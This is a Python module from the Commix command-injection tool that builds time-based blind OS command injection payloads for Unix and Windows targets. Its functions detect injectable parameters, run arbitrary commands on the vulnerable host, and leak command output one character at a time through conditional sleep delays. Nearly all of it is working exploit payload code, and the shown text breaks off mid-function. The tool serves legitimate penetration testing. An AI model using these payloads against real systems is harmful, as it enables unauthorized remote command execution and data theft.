#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass
  else:
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )
      

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.SINGLE_WHITESPACE +
                 pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator in (";", "%0a"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )


    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
Build a raw shell numeric comparison for false-positive checks; Unix-only.
"""
def condition_check(separator, condition, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return None
  if separator in (";", "%0a"):
    payload = (separator +
              "if [ " + condition + " ]" + separator +
              "then sleep " + str(timesec) + separator +
              "fi"
              )
  elif separator == _urllib.parse.quote("&&"):
    payload = (_urllib.parse.quote("&") +
              "sleep 0" + separator +
              "[ " + condition + " ]" + separator +
              "sleep " + str(timesec)
              )
  elif separator == "||":
    pipe = "|"
    payload = (pipe +
              "[ ! " + condition + " ]" + separator +
              "sleep " + str(timesec)
              )
  else:
    return None

  if settings.CUSTOM_INJECTION_MARKER:
    payload = payload + separator

  return checks.sanitize_payload_newlines(payload)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " +str(output_length)+ " -ne " + settings.CMD_SUB_PREFIX + "echo -n \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" +
                 pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "%0a"):
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )


    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.sanitize_payload_newlines(payload)

"""
Ordering (not equality) length check, so the output length can be binary searched.
"""
def get_length(separator, cmd, candidate_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + "\"') do if %i GEQ " + str(candidate_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + "\"') do if %i GEQ " + str(candidate_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "if [ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "[ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                )

    elif separator == "||" :
      pipe = "|"
      # Keep the leading pipe and "||" injection syntax; only length computation runs pipe-free.
      payload = (pipe +
                 # Inverted to -gt: "||" only runs sleep when this test fails, so sleep still fires exactly when candidate_length <= actual.
                 "[ " + str(candidate_length) + " -gt $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + ";echo ${#" + settings.RANDOM_VAR_GENERATOR + "}) ]" + separator +
                 "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_length_alter_shell(separator, cmd, candidate_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i GEQ " + str(candidate_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i GEQ " + str(candidate_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(candidate_length) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(candidate_length) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Inverted to -gt: "||" only runs sleep when this test fails, so sleep still fires exactly when candidate_length <= actual.
                 "[ " + str(candidate_length) + " -gt " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.sanitize_payload_newlines(payload)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  # Use bisection by default; validation re-probes the resolved value with equality.
  win_operator = "GEQ" if operator == "-le" else "EQU"
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    cmd_exec = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    settings.USER_APPLIED_CMD = cmd
    # Strip the prefix with shell parameter expansion and keep the next byte literally.
    qmarks = "?" * (num_of_chars - 1)
    ordinal_expr = "$(printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\")"

    if separator in (";", "%0a") :
      payload = (separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + separator +
                "then sleep " + str(timesec) + separator +
                "fi"
                )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0 " + separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + "\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ] " + separator +
                "sleep " + str(timesec)
                )

    elif separator == "||" :
      pipe = "|"
      # Keep the pipe syntax; run extraction pipe-free in a self-contained subshell.
      payload = (pipe +
                "[ " + str(ascii_char) + " -gt $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + ";" +
                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "};" +
                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"};" +
                "printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\") ]" + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  # Same bisection comparison by default as get_char() - validation re-probes with an equality operator.
  win_operator = "GEQ" if operator == "-le" else "EQU"
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator == "||" :
      pipe = "|"
      # Inverted to -gt (like get_char()'s "||" branch): "||" only runs sleep when this test fails.
      payload = (pipe +
                 "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    if separator in (";", "%0a"):
      payload = (separator +
